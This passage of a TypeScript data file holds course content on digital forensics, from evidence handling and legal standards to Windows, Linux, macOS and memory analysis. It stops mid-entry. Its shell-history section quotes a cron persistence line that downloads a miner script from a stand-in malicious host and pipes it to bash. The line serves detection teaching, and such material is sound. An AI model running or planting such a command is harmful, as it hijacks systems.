export interface Concept {
  id: string;
  name: string;
  description: string;
  keyPoints: string[];
  tradeoffs?: string[];
  realWorld?: string[];
}

export interface Topic {
  id: number;
  title: string;
  part: number;
  partTitle: string;
  summary: string;
  concepts: Concept[];
}

export type Chapter = Topic;

export const parts = [
  { id: 1, title: 'Foundations' },
  { id: 2, title: 'System Forensics' },
  { id: 3, title: 'Network & Mobile' },
  { id: 4, title: 'Advanced Topics' },
];

export const topics: Topic[] = [
  // Part 1: Foundations
  {
    id: 1,
    title: 'Forensic Principles & Legal Framework',
    part: 1,
    partTitle: 'Foundations',
    summary:
      'The foundational principles of digital forensics including chain of custody, legal admissibility standards, and the importance of forensic soundness in every investigation.',
    concepts: [
      {
        id: '1-1',
        name: 'Chain of Custody & Evidence Handling',
        description:
          'The documented, unbroken trail showing the seizure, custody, control, transfer, analysis, and disposition of digital evidence.',
        keyPoints: [
          'Chain of custody documents every person who handled the evidence, when they handled it, what they did with it, and how it was stored — any gap can render evidence inadmissible',
          'Evidence must be sealed in anti-static, tamper-evident bags with unique case/evidence numbers, and stored in a secure, access-controlled environment',
          'Hash values (MD5 and SHA-256) must be computed at time of acquisition and re-verified at every transfer point to prove the evidence has not been altered',
          'Digital evidence is fragile — improper handling (booting a suspect machine, writing to a disk) can permanently destroy or alter critical artifacts',
          'First responders should document the scene with photographs, note running processes, network connections, and the state of all devices before powering down',
        ],
        tradeoffs: [
          'Strict chain of custody procedures slow down analysis but are essential for legal admissibility — shortcuts can cause case dismissal',
          'Live acquisition captures volatile data (RAM, network connections) but risks altering the system state and compromising the chain of custody',
          'Over-documentation increases overhead but under-documentation creates gaps that opposing counsel will exploit',
        ],
        realWorld: [
          'United States v. Comprehensive Drug Testing — evidence mishandled by government, leading to stricter chain of custody requirements for digital evidence',
          'Law enforcement using Faraday bags to isolate mobile devices from network signals during seizure to prevent remote wipe commands',
          'Corporate incident response teams using evidence intake forms and chain of custody logs in tools like CrowdStrike Falcon and EnCase',
          'NIST SP 800-86 Guide to Integrating Forensic Techniques into Incident Response — defines evidence handling best practices',
        ],
      },
      {
        id: '1-2',
        name: 'Legal Standards & Admissibility (Daubert, FRE)',
        description:
          'The legal standards that govern whether digital forensic evidence is admissible in court, including expert witness qualification and scientific methodology requirements.',
        keyPoints: [
          'Daubert Standard: the judge acts as gatekeeper — expert testimony must be based on (1) testable methodology, (2) peer-reviewed techniques, (3) known error rates, (4) general acceptance in the forensic community',
          'Federal Rules of Evidence (FRE) Rule 702: expert testimony is admissible if it helps the trier of fact and is based on sufficient facts, reliable principles, and reliable application of those principles',
          'FRE Rule 901(a): authentication requires evidence sufficient to support a finding that the item is what its proponent claims — for digital evidence this means proving integrity via hashing and chain of custody',
          'The Frye Standard (older, still used in some states): evidence is admissible if the technique is "generally accepted" by the relevant scientific community',
        ],
        tradeoffs: [
          'Daubert is more flexible than Frye (allows novel techniques if scientifically valid) but places more burden on the expert to justify methodology',
          'Law enforcement tools (Cellebrite, EnCase) have established legal precedent, but open-source tools (Autopsy, Volatility) require the examiner to demonstrate reliability more rigorously',
          'Over-reliance on tool output without understanding the underlying methodology weakens testimony under cross-examination',
        ],
        realWorld: [
          'Daubert v. Merrell Dow Pharmaceuticals (1993) — Supreme Court case establishing the modern standard for expert testimony admissibility',
          'Lorraine v. Markel American Insurance Co. — landmark case defining a five-step framework for authenticating digital evidence under FRE',
          'Cellebrite UFED extractions challenged in court when examiners cannot explain the extraction methodology beyond "the tool did it"',
        ],
      },
      {
        id: '1-3',
        name: 'Forensic Soundness & Documentation',
        description:
          'The principle that forensic processes must not alter the original evidence, and that every action taken during an investigation must be thoroughly documented and reproducible.',
        keyPoints: [
          'Forensic soundness means the original evidence is preserved in its exact state — all analysis is performed on verified forensic copies, never the original',
          'Documentation must record: tools used (name, version), commands executed, timestamps, findings at each step, and the examiner\'s qualifications',
          'Standard operating procedures (SOPs) ensure consistency and reproducibility — another examiner should be able to follow the same steps and reach the same conclusions',
          'ISO/IEC 27037:2012 defines guidelines for identification, collection, acquisition, and preservation of digital evidence',
          'Reports must distinguish between facts (what the evidence shows) and opinions (the examiner\'s interpretation) — conflating these undermines credibility',
        ],
        tradeoffs: [
          'Forensic soundness requires write-blocking and imaging which takes significant time — in time-critical incidents this can delay response',
          'Detailed documentation is time-intensive but is the only way to defend your findings months or years later in court',
          'Automated tools generate logs but examiners must still manually document their reasoning, decisions, and any deviations from SOPs',
        ],
        realWorld: [
          'SWGDE (Scientific Working Group on Digital Evidence) best practices require complete documentation of the forensic process',
          'ACPO Guidelines (UK) — four principles of digital evidence: no action should change data, the person accessing original data must be competent, an audit trail must exist, and the case officer is responsible for compliance',
          'EnCase and FTK Imager generate automatic audit logs, but examiners still submit separate case reports with narrative explanations',
          'NIST CFTT (Computer Forensics Tool Testing) program validates that forensic tools produce reliable, reproducible results',
        ],
      },
    ],
  },
  {
    id: 2,
    title: 'Evidence Acquisition & Imaging',
    part: 1,
    partTitle: 'Foundations',
    summary:
      'The tools and techniques for creating exact bit-for-bit copies of digital media, ensuring integrity through cryptographic hashing, and understanding forensic image formats.',
    concepts: [
      {
        id: '2-1',
        name: 'Write Blockers & Imaging Tools (dd, dc3dd, FTK Imager)',
        description:
          'Hardware and software mechanisms that prevent any writes to source media during acquisition, and the tools used to create forensic images.',
        keyPoints: [
          'Hardware write blockers (Tableau/WiebeTech) physically intercept write commands between the host and the evidence drive — they are the gold standard for forensic acquisition',
          'Software write blockers (Linux mount -o ro, Windows registry-based blockers) are alternatives but are less trusted in court because they rely on the OS honoring the read-only flag',
          'dd: the classic Unix imaging tool — "dd if=/dev/sda of=image.raw bs=4096 conv=noerror,sync" creates a raw bit-for-bit copy but has no built-in hashing or error logging',
          'dc3dd: enhanced dd from the DoD Cyber Crime Center — adds on-the-fly hashing (MD5/SHA-256), split output, progress reporting, and error logging',
          'FTK Imager (AccessData/Exterro): GUI-based tool that creates E01/raw images with built-in hashing, metadata embedding, and verification — widely accepted in court',
        ],
        tradeoffs: [
          'Hardware write blockers are more expensive ($200-$1000+) but provide stronger legal defensibility than software-only solutions',
          'dd is universally available on Unix systems but lacks error handling and logging — dc3dd or dcfldd should be preferred for forensic work',
          'Full disk imaging captures everything (including unallocated space and slack space) but is slow and requires storage equal to or greater than the source drive',
        ],
        realWorld: [
          'Tableau T35689iu Forensic USB 3.0 Bridge — the most widely used hardware write blocker in law enforcement forensic labs worldwide',
          'SIFT Workstation (SANS Investigative Forensic Toolkit) ships with dc3dd, dcfldd, and other acquisition tools pre-configured on a Linux forensic distribution',
          'Law enforcement field acquisition kits typically include a Tableau write blocker, FTK Imager on a bootable USB, and large-capacity destination drives',
          'Guymager: open-source Linux GUI imaging tool that supports E01 and AFF formats with parallel hashing — popular in European forensic labs',
        ],
      },
      {
        id: '2-2',
        name: 'Forensic Image Formats (E01, AFF4, raw)',
        description:
          'The different file formats used to store forensic disk images, each with distinct capabilities for compression, metadata, and integrity verification.',
        keyPoints: [
          'Raw/dd format: exact bit-for-bit copy with no metadata or compression — simple and universally compatible but large and lacks built-in integrity verification',
          'E01 (EnCase Evidence File): proprietary format that supports compression (zlib), embedded MD5/SHA-1 hashes per data segment, case metadata, and error detection via CRC checksums',
          'AFF4 (Advanced Forensic Format 4): open-source format using ZIP64 containers — supports compression, arbitrary metadata in RDF, multiple hash algorithms, and logical/physical imaging in one container',
          'Split images: large disks are often split into 2GB or 4GB segments (E01 → E01, E02, E03...) for compatibility with FAT32 file systems and optical media',
        ],
        tradeoffs: [
          'E01 is the most widely accepted format in court and supported by nearly all forensic tools, but it is a proprietary format controlled by OpenText (formerly Guidance/EnCase)',
          'Raw images are tool-agnostic and can be mounted directly by any OS, but lack metadata and require external hash verification files',
          'AFF4 is technically superior (open standard, flexible metadata) but has less tool support and less legal precedent than E01',
        ],
        realWorld: [
          'EnCase Forensic and FTK both natively produce and consume E01 files — E01 is the de facto standard in US and international law enforcement',
          'Autopsy (open-source forensic platform) supports raw, E01, and AFF4 formats, lowering the barrier to using open formats',
          'The ewflib/libewf library allows open-source tools to read and write E01 files, reducing vendor lock-in',
          'Cloud forensic acquisitions increasingly use AFF4 because it can store logical file collections, cloud API responses, and memory dumps in a single container',
        ],
      },
      {
        id: '2-3',
        name: 'Hash Verification & Integrity (MD5, SHA-256)',
        description:
          'Cryptographic hash functions used to verify that forensic images are exact, unaltered copies of the original evidence.',
        keyPoints: [
          'Hash verification is the cornerstone of forensic integrity — if the hash of the image matches the hash of the original, the copy is a proven exact duplicate',
          'MD5 (128-bit): fast and widely used in forensics, but cryptographically broken (collision attacks) — still acceptable for forensic integrity verification because the threat model is accidental alteration, not adversarial collision',
          'SHA-256 (256-bit): collision-resistant and recommended by NIST — provides stronger assurance and is increasingly required by forensic standards and courts',
          'Best practice: compute both MD5 and SHA-256 at acquisition time — MD5 for backward compatibility and speed, SHA-256 for cryptographic strength',
          'Hash verification must be performed at multiple points: at acquisition, when received by the lab, before analysis, and before court presentation',
        ],
        tradeoffs: [
          'MD5 is faster to compute but theoretically vulnerable to collision attacks — defense attorneys have attempted (usually unsuccessfully) to challenge MD5-only verification',
          'SHA-256 provides stronger guarantees but takes longer to compute on large drives (terabytes of data)',
          'Hashing the entire disk image verifies overall integrity but sector-level or file-level hashing provides more granular verification at the cost of more computation',
        ],
        realWorld: [
          'NIST NSRL (National Software Reference Library) uses SHA-1 and MD5 to identify known files — used in forensic tools to filter known-good files from analysis',
          'EnCase and FTK Imager compute and embed both MD5 and SHA-1 (or SHA-256) hashes in E01 image metadata automatically during acquisition',
          'The md5sum and sha256sum commands on Linux are used for manual verification: "sha256sum forensic_image.raw" compared against the acquisition log',
        ],
      },
    ],
  },
  {
    id: 3,
    title: 'File Systems & Data Recovery',
    part: 1,
    partTitle: 'Foundations',
    summary:
      'Understanding file system internals, how deleted data persists on disk, and techniques for recovering files from unallocated space, slack space, and damaged media.',
    concepts: [
      {
        id: '3-1',
        name: 'File System Internals (NTFS MFT, ext4 inodes, APFS)',
        description:
          'The internal structures of major file systems that forensic examiners must understand to locate, recover, and interpret digital evidence.',
        keyPoints: [
          'NTFS Master File Table ($MFT): every file and directory has an MFT entry containing metadata (timestamps, permissions, size) and, for small files (<~700 bytes), the actual data stored as a resident attribute',
          'NTFS Alternate Data Streams (ADS): files can have hidden data streams attached (e.g., file.txt:hidden.exe) — used by malware and often missed by basic analysis tools',
          'ext4 inodes: each file has an inode storing metadata and pointers to data blocks — ext4 uses extents (contiguous block ranges) instead of indirect block pointers for better performance',
          'APFS (Apple File System): copy-on-write design with snapshots, clones, and strong encryption — timestamps are stored in nanosecond precision, complicating timeline analysis',
          'All file systems maintain timestamps: Created, Modified, Accessed, and entry-Modified (MACE/MACB) — understanding which operations update which timestamps is critical for timeline forensics',
        ],
        tradeoffs: [
          'NTFS stores significant metadata in the MFT (including small file contents), making it rich for forensics but complex to parse — tools like analyzeMFT and MFTECmd automate this',
          'ext4 journaling aids recovery (uncommitted changes can be found in the journal) but the journal is circular and overwrites old entries quickly',
          'APFS encryption and copy-on-write make forensic analysis more challenging — traditional carving techniques may not work on encrypted APFS volumes without the decryption key',
        ],
        realWorld: [
          'Eric Zimmerman\'s MFTECmd: parses NTFS $MFT entries and outputs CSV for timeline analysis — widely used in DFIR investigations',
          'The Sleuth Kit (TSK) provides istat, fls, and icat commands for examining file system metadata across NTFS, ext4, FAT, HFS+, and APFS',
          'macOS Time Machine uses APFS snapshots — forensic examiners can recover historical file states from snapshots even if the user deleted the files',
          'Ext4 journal recovery: the ext4 journal (jbd2) can contain recently deleted file data and metadata, recoverable with tools like extundelete',
        ],
      },
      {
        id: '3-2',
        name: 'Slack Space & Unallocated Space Analysis',
        description:
          'The areas on a disk where remnants of old data persist after deletion or file modification — a critical source of forensic evidence.',
        keyPoints: [
          'File slack (RAM slack + drive slack): when a file does not fill its last allocated cluster, the remaining bytes contain data from whatever was previously in that cluster — this can include fragments of deleted files',
          'Unallocated space: clusters that are not currently assigned to any file — when a file is "deleted," the file system marks its clusters as unallocated but does not erase the data',
          'Volume slack: space between the end of the file system and the end of the partition — often contains remnants of a previously larger file system or partition',
          'Swap space/pagefile: operating systems write memory pages to disk — pagefile.sys (Windows) and swap partitions (Linux) can contain passwords, encryption keys, chat messages, and other volatile data',
        ],
        tradeoffs: [
          'Slack space analysis can recover critical evidence fragments but the data is often partial and lacks context — correlation with other artifacts is necessary',
          'Unallocated space analysis is time-consuming on large drives (terabytes) and produces many false positives — keyword searches and file carving help focus the analysis',
          'SSD TRIM commands instruct the drive to zero out unallocated blocks, significantly reducing the amount of recoverable data compared to traditional HDDs',
        ],
        realWorld: [
          'The BTK serial killer case (Dennis Rader): metadata recovered from a deleted Word document on a floppy disk led to his identification and arrest',
          'Enron investigation: forensic examiners recovered deleted emails and documents from unallocated space on employee hard drives',
          'EnCase and X-Ways Forensics provide built-in slack space and unallocated space viewers with keyword search and file carving capabilities',
          'blkls (The Sleuth Kit) extracts unallocated space from a forensic image for standalone analysis and carving',
        ],
      },
      {
        id: '3-3',
        name: 'File Carving & Deleted File Recovery',
        description:
          'Techniques for recovering files from raw disk data by identifying file signatures (magic bytes) rather than relying on file system metadata.',
        keyPoints: [
          'File carving scans raw data for known file headers (magic bytes) and footers — e.g., JPEG starts with FF D8 FF, PDF starts with %PDF, ZIP starts with PK (50 4B)',
          'Header-footer carving: identifies the start of a file by its header and the end by its footer — works well for formats with defined structure (JPEG, PDF, ZIP)',
          'Header-size carving: uses the header to determine file size (e.g., PNG includes dimensions, some formats embed total size) — useful when footers are absent or the format is fragmented',
          'Fragment recovery carving (advanced): reassembles files that are stored in non-contiguous clusters — computationally expensive and often requires file-format-specific logic',
          'File system-aware recovery: when the file system metadata is partially intact, tools can use MFT entries or inodes to locate deleted file data more accurately than raw carving',
        ],
        tradeoffs: [
          'File carving works without file system metadata (useful for damaged or reformatted drives) but produces false positives and cannot recover file names or directory structure',
          'Carving is ineffective when data is fragmented across non-contiguous clusters — reassembly requires format-specific knowledge and is computationally expensive',
          'SSD wear leveling and TRIM significantly reduce carving success rates — SSDs may internally relocate or zero blocks without the OS or forensic tools being aware',
        ],
        realWorld: [
          'Scalpel and Foremost: open-source file carving tools that scan raw images for known file signatures — Scalpel is a next-generation rewrite of Foremost with better performance',
          'PhotoRec: widely used open-source carver that recovers 480+ file formats from hard drives, CDs, and memory cards — ignores file system structure entirely',
          'Magnet AXIOM and X-Ways Forensics include built-in carving engines with customizable signature databases for automated recovery during case processing',
          'In child exploitation cases, forensic carving of unallocated space frequently recovers deleted images that the suspect believed were permanently destroyed',
        ],
      },
    ],
  },

  // Part 2: System Forensics
  {
    id: 4,
    title: 'Windows Forensics',
    part: 2,
    partTitle: 'System Forensics',
    summary:
      'Analyzing Windows-specific artifacts including the registry, event logs, and file system artifacts that record user activity, program execution, and system events.',
    concepts: [
      {
        id: '4-1',
        name: 'Registry Analysis (SAM, SYSTEM, SOFTWARE, NTUSER.DAT)',
        description:
          'The Windows Registry is a hierarchical database storing configuration settings — it is one of the richest sources of forensic evidence on a Windows system.',
        keyPoints: [
          'SAM (Security Account Manager): stores local user account information including password hashes (NTLM), account creation dates, last login times, and login counts',
          'SYSTEM hive: contains hardware configuration, services, the computer name, timezone settings (critical for timeline accuracy), and the last known good configuration',
          'SOFTWARE hive: records installed applications, OS version, network configurations, and the Windows Firewall rules — the "Run" and "RunOnce" keys show persistence mechanisms',
          'NTUSER.DAT (per-user): stores user-specific settings including recently accessed files (RecentDocs), typed URLs, search history, mounted devices (MountPoints2), and UserAssist (encoded program execution records)',
          'ShellBags: stored in NTUSER.DAT and UsrClass.dat — record folder access patterns, window positions, and view settings, providing evidence of folder browsing even after the folders are deleted',
        ],
        tradeoffs: [
          'The registry contains massive amounts of data — targeted analysis using known forensic keys is more efficient than exhaustive examination, but risks missing unknown artifacts',
          'Registry timestamps only record the last modification time of a key, not individual values — determining when a specific value was changed requires correlating with other artifacts',
          'Deleted registry keys can sometimes be recovered from unallocated space within hive files, but registry hive slack analysis is complex and tool-dependent',
        ],
        realWorld: [
          'Eric Zimmerman\'s Registry Explorer and RECmd: parse and search registry hives offline with batch processing — the standard tools in modern DFIR',
          'RegRipper (Harlan Carvey): modular Perl-based tool with plugins that automatically extract forensically significant registry artifacts',
          'USB device history is reconstructed from SYSTEM\\MountedDevices, SYSTEM\\Enum\\USBSTOR, and NTUSER\\MountPoints2 — proving which USB devices were connected to a system and when',
          'The UserAssist key uses ROT-13 encoding on program names — decoding reveals a complete execution history with run counts and last execution timestamps',
        ],
      },
      {
        id: '4-2',
        name: 'Windows Event Logs (Security, System, Application)',
        description:
          'Windows Event Logs record system, security, and application events in .evtx format — they are essential for reconstructing timelines and detecting malicious activity.',
        keyPoints: [
          'Security.evtx: logon events (4624/4625), account management (4720/4726), privilege use (4672), object access (4663), and policy changes — the most forensically valuable log',
          'System.evtx: service start/stop (7035/7036), driver installation, system startup/shutdown (6005/6006), and time changes (1) — useful for establishing system uptime and service manipulation',
          'Application.evtx: application errors and warnings, Windows Error Reporting, and application-specific events — useful for detecting application crashes potentially caused by exploitation',
          'Event ID 4624 logon types: Type 2 (interactive/local), Type 3 (network/SMB), Type 7 (unlock), Type 10 (RDP) — the logon type reveals how an attacker accessed the system',
          'PowerShell logging (Event IDs 4103/4104 in Microsoft-Windows-PowerShell/Operational): ScriptBlock logging captures the full text of executed PowerShell commands — critical for detecting fileless malware',
        ],
        tradeoffs: [
          'Event logs have a maximum size and use circular logging by default — old events are overwritten, and attackers often clear logs (Event ID 1102 in Security log indicates log clearing)',
          'Enabling verbose logging (PowerShell ScriptBlock, Sysmon, advanced audit policies) dramatically increases detection capability but also increases log volume and storage requirements',
          'Windows event log forwarding (WEF) centralizes logs for analysis but requires infrastructure setup and can introduce latency',
        ],
        realWorld: [
          'Sysmon (System Monitor): a Microsoft Sysinternals tool that logs process creation (Event 1), network connections (Event 3), file creation (Event 11), and registry modifications (Event 13) — essential for advanced threat detection',
          'EvtxECmd (Eric Zimmerman): parses .evtx files to CSV/JSON with timeline-friendly output for bulk analysis in tools like Timeline Explorer',
          'MITRE ATT&CK maps specific Event IDs to attack techniques — e.g., Event ID 4688 (process creation) maps to T1059 (Command and Scripting Interpreter)',
          'The SolarWinds/SUNBURST attack (2020) was detected in part through analysis of Windows Event Logs showing anomalous service installations and network connections',
        ],
      },
      {
        id: '4-3',
        name: 'Windows Artifacts (Prefetch, ShimCache, AmCache, $MFT)',
        description:
          'Windows maintains numerous artifacts that record program execution, file access, and system activity — these artifacts persist even after users attempt to cover their tracks.',
        keyPoints: [
          'Prefetch (C:\\Windows\\Prefetch\\*.pf): records the last 8 execution times, run count, and files/directories referenced during the first 10 seconds of execution — limited to 1024 entries on Win10+',
          'ShimCache (AppCompatCache in SYSTEM hive): records file path, size, and last modification time for executables the OS has seen — entries are written on shutdown, providing evidence of execution even if Prefetch is disabled',
          'AmCache (C:\\Windows\\appcompat\\Programs\\Amcache.hve): records full file path, SHA-1 hash, PE metadata (compiler, linker version), and first execution time — provides hash-based identification of executables',
          '$MFT (Master File Table): as discussed in file system internals — contains MACE timestamps for every file, including created/modified/accessed/entry-modified times that enable detailed timeline reconstruction',
          'LNK files (C:\\Users\\*\\AppData\\Roaming\\Microsoft\\Windows\\Recent\\*.lnk): shortcut files that record target path, MAC timestamps, volume serial number, and sometimes the machine\'s NetBIOS name — persist after the target file is deleted',
        ],
        tradeoffs: [
          'Prefetch provides the most detailed execution evidence but can be disabled by policy or on SSDs in some Windows configurations — always check if Prefetch is enabled',
          'ShimCache records file "shimming" but does not definitively prove execution in all cases — it proves the OS processed the file, which is strong but not absolute evidence of execution',
          'AmCache provides SHA-1 hashes for IOC matching but is maintained by the Program Compatibility Assistant and may not record all executions — it complements rather than replaces other artifacts',
        ],
        realWorld: [
          'PECmd (Eric Zimmerman): parses Prefetch files and outputs execution timelines — used to prove when malware was first and last executed on a compromised system',
          'AppCompatCacheParser (Eric Zimmerman): extracts ShimCache entries from the SYSTEM hive for timeline analysis',
          'SANS DFIR poster "Windows Forensic Analysis" maps all major artifacts to investigation questions (What executed? When? What files were accessed?)',
          'In APT investigations, AmCache SHA-1 hashes are cross-referenced with threat intelligence feeds (VirusTotal, MISP) to identify known malicious tools',
        ],
      },
    ],
  },
  {
    id: 5,
    title: 'Linux & macOS Forensics',
    part: 2,
    partTitle: 'System Forensics',
    summary:
      'Forensic analysis of Linux and macOS systems, covering log analysis, system artifacts, user activity tracking, and platform-specific evidence sources.',
    concepts: [
      {
        id: '5-1',
        name: 'Linux Log Analysis (/var/log, journalctl, auth.log)',
        description:
          'Linux systems maintain extensive logs that record authentication events, system activity, and application behavior — these are primary evidence sources in Linux forensics.',
        keyPoints: [
          '/var/log/auth.log (Debian/Ubuntu) or /var/log/secure (RHEL/CentOS): records all authentication events — SSH logins, sudo usage, su commands, PAM failures, and account modifications',
          '/var/log/syslog or /var/log/messages: general system messages including kernel events, service start/stop, cron execution, and hardware events',
          'journalctl (systemd journal): binary log format with structured metadata (process ID, user, priority) — "journalctl --since=yesterday --until=today" enables precise time-based filtering',
          '/var/log/wtmp and /var/log/btmp: binary logs recording successful logins (wtmp, read with "last" command) and failed login attempts (btmp, read with "lastb") — include TTY, source IP, and duration',
          '/var/log/cron: records cron job execution including the user, command, and execution time — attackers commonly establish persistence via cron jobs',
        ],
        tradeoffs: [
          'Text-based logs (/var/log/auth.log) are easy to read and parse but are also easy for attackers to modify — log integrity verification (rsyslog with remote logging) is essential',
          'journalctl binary format is harder to tamper with and supports structured queries, but requires systemd and is not available on older or minimal Linux distributions',
          'Log rotation (logrotate) compresses and archives old logs to save space but can destroy evidence if retention periods are too short — forensic preservation should happen before rotation',
        ],
        realWorld: [
          'In SSH brute-force investigations, auth.log provides the source IP, username attempted, and authentication method for every attempt — "grep sshd /var/log/auth.log" is often the first command',
          'The Linux Audit Framework (auditd) provides detailed syscall-level logging — "ausearch -m execve" shows every command executed on the system',
          'SIFT Workstation includes log2timeline (Plaso) which can parse Linux logs into a unified forensic timeline alongside file system artifacts',
          'In the Equifax breach (2017), Apache access logs and Linux system logs were critical for understanding the attacker\'s exploitation of the Struts vulnerability',
        ],
      },
      {
        id: '5-2',
        name: 'macOS Artifacts (FSEvents, Spotlight, Unified Logs)',
        description:
          'macOS maintains unique forensic artifacts that record file system changes, search indexing, and system activity — these provide rich evidence for forensic investigations.',
        keyPoints: [
          'FSEvents (.fseventsd): records every file system change (creation, deletion, modification, renaming) with timestamps and flags — stored in binary files in /.fseventsd/ and provides a comprehensive file activity history',
          'Spotlight metadata (/.Spotlight-V100): the macOS search index stores file metadata (kMDItemContentType, kMDItemLastUsedDate, kMDItemAuthors) — can reveal information about files even after deletion',
          'Unified Logs (introduced in macOS Sierra): centralized logging system replacing ASL — "log show --predicate \'process == \"sshd\"\' --last 1h" provides powerful structured querying',
          'KnowledgeC database (~/Library/Application Support/Knowledge/knowledgeC.db): tracks application usage, screen time, device activity, and Safari browsing — a goldmine for user activity reconstruction',
          'Quarantine events (com.apple.LaunchServices.QuarantineEventsV2): tracks every file downloaded from the internet including the source URL, download timestamp, and the application that downloaded it',
        ],
        tradeoffs: [
          'FSEvents provides comprehensive file system activity history but uses eventual consistency — very rapid changes may be coalesced into a single event, losing granularity',
          'Unified Logs are extremely detailed but use aggressive compression and short retention — critical log entries may be purged within days on busy systems',
          'macOS Full Disk Access (FDA) and System Integrity Protection (SIP) restrict forensic tool access — acquiring a macOS system often requires booting from external media or using MDM-based collection',
        ],
        realWorld: [
          'mac_apt (macOS Artifact Parsing Tool) by Yogesh Khatri: extracts and parses FSEvents, Spotlight, Unified Logs, and dozens of other macOS artifacts',
          'The Quarantine database has been used in investigations to prove when and from where a user downloaded malicious files — even after the files themselves were deleted',
          'Crowdstrike and Mandiant use FSEvents parsing extensively in macOS incident response to reconstruct attacker file operations on compromised Macs',
          'APFS snapshots (accessible via "tmutil listlocalsnapshots /") can contain complete point-in-time copies of the file system — invaluable for recovering pre-incident state',
        ],
      },
      {
        id: '5-3',
        name: 'Shell History & Cron Job Forensics',
        description:
          'User shell histories and scheduled tasks provide direct evidence of commands executed and persistence mechanisms established on Unix-like systems.',
        keyPoints: [
          'Bash history (~/.bash_history): records commands executed by each user — by default no timestamps, but HISTTIMEFORMAT can enable them; attackers often unset HISTFILE or link it to /dev/null',
          'Zsh history (~/.zsh_history): records commands with timestamps by default (":timestamp:0;command" format) — zsh is the default shell on modern macOS, making this a key artifact',
          'Cron jobs (/var/spool/cron/crontabs/, /etc/crontab, /etc/cron.d/): scheduled tasks that execute automatically — a common persistence mechanism for attackers and malware',
          'Systemd timers: the modern replacement for cron on systemd-based Linux — "systemctl list-timers" shows all scheduled tasks; attackers create malicious .timer/.service unit pairs',
          'The .bash_profile, .bashrc, .zshrc, and .profile files execute on login/shell startup — attackers insert malicious commands here for persistence that survives reboots',
        ],
        tradeoffs: [
          'Shell history provides direct evidence of user commands but is trivially easy to delete or disable — absence of history is itself suspicious and should be documented',
          'Cron jobs run as the user who owns them and inherit that user\'s permissions — distinguishing between legitimate scheduled tasks and attacker persistence requires understanding the system\'s normal baseline',
          'Shell history files are written on shell exit by default — if the system crashes or the attacker kills the shell, the most recent commands may not be saved',
        ],
        realWorld: [
          'In cryptocurrency mining intrusion investigations, attackers frequently add cron jobs like "*/5 * * * * curl http://malicious.com/miner.sh | bash" for persistence',
          'The HISTCONTROL=ignorespace bash setting means commands prefixed with a space are not recorded — sophisticated attackers exploit this to hide their commands',
          'Linux compromise assessments check for anomalous cron entries, modified shell RC files, and unusual systemd services as indicators of persistence — tools like OSSEC and osquery automate this',
          'In the SolarWinds compromise, attackers established persistence on Linux systems through modified cron jobs and shell scripts in addition to the Windows-focused SUNBURST backdoor',
        ],
      },
    ],
  },
  {
    id: 6,
    title: 'Memory Forensics',
    part: 2,
    partTitle: 'System Forensics',
    summary:
      'Acquiring and analyzing volatile memory (RAM) to detect malware, extract encryption keys, recover running processes, and identify evidence that exists only in memory.',
    concepts: [
      {
        id: '6-1',
        name: 'Memory Acquisition & Volatility Framework',
        description:
          'The techniques for capturing physical memory from a running system and the primary framework for analyzing memory dumps.',
        keyPoints: [
          'Memory acquisition tools: WinPMEM, LiME (Linux Memory Extractor), DumpIt (Magnet), and Belkasoft RAM Capturer — each dumps physical memory to a raw file while minimizing system impact',
          'Volatility 3: the industry-standard open-source memory forensics framework — uses OS-specific symbol tables (ISF files) to parse kernel structures and extract forensic artifacts',
          'Key Volatility plugins: pslist/psscan (process listing), netscan (network connections), filescan (open file handles), dlllist (loaded DLLs), cmdline (process command lines), and malfind (injected code detection)',
          'Memory acquisition must happen before system shutdown — RAM is volatile and data begins degrading within seconds of power loss (cold boot attacks exploit residual DRAM data)',
          'Virtual memory complicates analysis: some memory pages may be swapped to the pagefile — comprehensive analysis requires both physical memory and the pagefile/swap',
        ],
        tradeoffs: [
          'Memory acquisition alters the system state (the acquisition tool itself runs in memory) — this is unavoidable but must be documented; the alternative (not acquiring memory) loses critical volatile evidence',
          'Volatility 2 has broader community plugin support but Volatility 3 has a cleaner architecture and better Windows 10/11 support — many teams maintain both',
          'Kernel-mode acquisition (WinPMEM) captures all physical memory but requires administrative privileges and can trigger anti-cheat or security software',
        ],
        realWorld: [
          'LiME (Linux Memory Extractor): kernel module that acquires memory on Linux systems — "insmod lime.ko path=/tmp/mem.raw format=raw" — used in cloud incident response where disk imaging is impractical',
          'Volatility Foundation\'s memory samples repository provides practice images for training — used in DFIR CTF competitions and academic courses',
          'In the NotPetya incident (2017), memory forensics was critical for recovering encryption keys from RAM before affected systems were powered down',
          'Rekall (Google): an alternative memory forensics framework (now mostly archived) — some unique plugins and techniques were ported back to Volatility 3',
        ],
      },
      {
        id: '6-2',
        name: 'Process & DLL Analysis in Memory',
        description:
          'Examining running processes, loaded libraries, and their relationships in a memory dump to identify malicious activity and reconstruct system state.',
        keyPoints: [
          'Process tree analysis: pslist walks the kernel\'s active process list (EPROCESS linked list) while psscan scans all of physical memory for process structures — discrepancies between the two indicate hidden/unlinked processes',
          'DLL analysis: dlllist shows DLLs loaded by each process — malware often loads malicious DLLs into legitimate processes (DLL injection/sideloading), detectable by unexpected DLLs in system processes',
          'Process memory sections: VAD (Virtual Address Descriptor) tree analysis reveals memory regions with suspicious permissions — PAGE_EXECUTE_READWRITE regions in non-code sections indicate injected shellcode',
          'Handle analysis: handles plugin shows open file handles, registry keys, mutexes, and named pipes per process — malware mutex names are common IOCs, and open file handles reveal accessed data',
          'Command line arguments: cmdline plugin reveals the exact command used to launch each process — encoded PowerShell commands (powershell -enc [base64]) are a strong indicator of compromise',
        ],
        tradeoffs: [
          'Process list analysis can miss rootkits that manipulate kernel structures — using both pslist (list-walking) and psscan (pool-tag scanning) provides complementary detection',
          'DLL analysis is effective for detecting injection but legitimate software also performs DLL injection (security tools, accessibility software) — context and baseline knowledge are essential',
          'Packed or encrypted malware in memory must be analyzed at the point where it is decrypted — the malfind plugin extracts potentially injected code sections but further analysis (disassembly) is often needed',
        ],
        realWorld: [
          'The malfind plugin in Volatility automatically identifies and extracts memory regions with injected code — it detects classic techniques like process hollowing, reflective DLL injection, and shellcode injection',
          'Cobalt Strike beacon detection: memory forensics reveals Cobalt Strike\'s reflective DLL loader and beacon configuration (including C2 server addresses) by scanning for known memory signatures',
          'APT investigations routinely find that fileless malware exists only in the memory space of legitimate processes like svchost.exe or explorer.exe — memory forensics is the only way to detect these',
          'MemProcFS (by Ulf Frisk): presents a memory dump as a virtual file system, allowing analysts to browse processes, modules, and memory regions as if navigating a directory structure',
        ],
      },
      {
        id: '6-3',
        name: 'Rootkit & Injection Detection in RAM',
        description:
